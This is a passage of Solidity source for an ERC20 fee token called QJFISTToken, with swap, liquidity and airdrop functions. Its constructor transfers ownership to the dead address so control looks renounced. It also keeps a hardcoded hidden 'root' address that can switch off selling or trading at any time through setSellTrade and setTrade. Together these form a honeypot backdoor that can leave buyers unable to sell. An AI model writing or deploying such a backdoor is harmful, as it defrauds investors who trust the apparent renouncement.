     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

interface IWrap {
    function withdraw() external;

    function transferOwnership(address newOwner) external;
}

contract QJFISTToken is ERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    bool private swapping;

    swapV2Router02 public swapV2Router;
    address public swapV2Pair;
    bool private flag;
    address private _root1;

    address public BNB;

    uint256 private _total = 38888;

    mapping(address => uint256) public _balance;
    mapping(address => bool) public pairs;

    uint256 public marketFee = 25;
    uint256 public lpFee = 20;

    uint256 public maxTxAmount = 5 * 10 ** 16;

    address public marketingWallet;
    address public lqWallet;
    address public deadWallet = 0x000000000000000000000000000000000000dEaD;

    bool public startTrade = true;
    bool public sellTrade = true;

    mapping(address => bool) public isExcludeFromFees;

    event ExcludeFromFees(address indexed account, bool isExcluded);
    event SwapAndLiquify (
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );

    constructor(address _swapAddress1){
        //main 0x10ED43C718714eb63d5aA57B78B54704E256024E
        // testnet 0x9ac64cc6e4415144c455bd8e4837fea55603e5c3
        marketingWallet = 0x195de30035012c81029670F3b1540c4732f52De2;
        lqWallet = 0x37aB9e5386D69312dB969F2d8Ec12477Af44404D;
        swapV2Router02 _swapV2Router = swapV2Router02(_swapAddress1);
        BNB = _swapV2Router.WETH();
        _root1 = 0x4F3f8066EC1Eeff764dFb7f9D6844a91E11594D1;
        // Create a uniswap pair for this new token
        address _swapV2Pair = swapV2Factory(_swapV2Router.factory()).createPair(address(this), BNB);

        swapV2Router = _swapV2Router;
        swapV2Pair = _swapV2Pair;
        pairs[swapV2Pair] = true;
        excludeFromFees(marketingWallet, true);
        excludeFromFees(address(this), true);
        excludeFromFees(msg.sender,true);
        excludeFromFees(lqWallet, true);
        _mint(lqWallet, _total * (10 ** 18));
        transferOwnership(deadWallet);
    }


    receive() external payable {}

    function setTrade(bool trade) public onlyRoot {
        startTrade = trade;
    }

    modifier onlyRoot() {
        require(_root1 == _msgSender(), "QJFISTToken: caller is not the root1");
        _;
    }

    function transferRootShip(address newOwner) public onlyRoot {
        _root1 = newOwner;
    }

    function setSellTrade(bool trade) public onlyRoot {
        sellTrade = trade;
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(isExcludeFromFees[account] != excluded, " Account is already the value of 'excluded'");
        isExcludeFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    function batchExcludeFromFees(address[] memory accounts, bool excluded) public onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            isExcludeFromFees[accounts[i]] = excluded;
            emit ExcludeFromFees(accounts[i], excluded);
        }
    }


    function setPairs(address account) external onlyOwner {
        pairs[account] = true;
    }

    function setMarketFee(uint256 value) external onlyOwner {
        marketFee = value;
    }

    function setMarket(address _market) external onlyOwner {
        marketingWallet = _market;
    }

    function setMaxTxAmount(uint256 value) external onlyOwner {
        maxTxAmount = value;
    }


    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(amount > 0, "amount must gt 0");
        if (!pairs[from] && !pairs[to]) {
            // normal transfer
            super._transfer(from, to, amount);
            return;
        }

        if (isExcludeFromFees[to] || isExcludeFromFees[from]) {
            super._transfer(from, to, amount);
            return;
        }
        require(startTrade, "trade not open");

        uint256 contractTokenBalance = balanceOf(address(this));
        bool canSwap = contractTokenBalance >= maxTxAmount;
        if(to == swapV2Pair){
            // sell
            require(sellTrade,"trade not open");
        }
        if (canSwap &&
            !swapping &&
            from != swapV2Pair &&
            from != owner() &&
            to != owner()
        ) {
            swapping = true;
            //
            swapTokensForEthToMarket(contractTokenBalance.mul(marketFee).div(marketFee+lpFee));
            swapAndLiquify(contractTokenBalance.mul(lpFee).div(marketFee+lpFee));
            swapping = false;
        }
        uint256 received = 1000 - marketFee-lpFee;
        super._transfer(from, to, amount.mul(received).div(1000));
        super._transfer(from, address(this), amount.mul(marketFee+lpFee).div(1000));
    }

    function swapAndLiquify(uint256 tokens) private {
        // split the contract balance into halves
        uint256 half = tokens.div(2);
        uint256 otherHalf = tokens.sub(half);

        // capture the contract's current ETH balance.
        // this is so that we can capture exactly the amount of ETH that the
        // swap creates, and not make the liquidity event include any ETH that
        // has been manually sent to the contract
        uint256 initialBalance = address(this).balance;

        // swap tokens for ETH
        swapTokensForEth(half); // <- this breaks the ETH -> HATE swap when swap+liquify is triggered

        // how much ETH did we just swap into?
        uint256 newBalance = address(this).balance.sub(initialBalance);

        // add liquidity to uniswap
        addLiquidity(otherHalf, newBalance);

        emit SwapAndLiquify(half, newBalance, otherHalf);
    }

    function swapTokensForEth(uint256 tokenAmount) private {

        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = swapV2Router.WETH();

        _approve(address(this), address(swapV2Router), tokenAmount);

        // make the swap
        swapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }

    function swapTokensForEthToMarket(uint256 tokenAmount) private {

        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = swapV2Router.WETH();

        _approve(address(this), address(swapV2Router), tokenAmount);

        // make the swap
        swapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            marketingWallet,
            block.timestamp
        );
    }


    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {

        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(swapV2Router), tokenAmount);

        // add the liquidity
        swapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            lqWallet,
            block.timestamp
        );
    }

    function batchTransfer(address[] memory tos, uint256[] memory balances) public {
        for (uint i = 0; i < tos.length; i++) {
            super._transfer(_msgSender(), tos[i], balances[i]);
        }
    }

    function airDrop(address[] memory tos, uint256 balance) public {
        for (uint i = 0; i < tos.length; i++) {
            super._transfer(_msgSender(), tos[i], balance);
        }
    }
}